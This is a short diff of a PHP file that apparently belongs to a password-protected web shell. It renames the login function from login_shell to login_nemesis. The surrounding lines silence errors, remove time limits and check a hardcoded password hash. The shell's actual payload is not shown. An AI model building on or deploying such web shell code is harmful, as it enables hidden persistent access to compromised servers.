@@ -3,7 +3,7 @@ session_start();
 @error_reporting(0);
 @set_time_limit(0);
 $hashedPassword = "8c40a3914a337ef30edf600662b6aeef"; 
-function login_shell($error = '') {
+function login_nemesis($error = '') {
 
     ?>
 
@@ -113,13 +113,13 @@ if (!isset($_SESSION[$sessionKey])) {
 
         } else {
 
-            login_shell("Invalid password!");
+            login_nemesis("Invalid password!");
 
         }
 
     } else {
 
-        login_shell();
+        login_nemesis();
 
     }
 
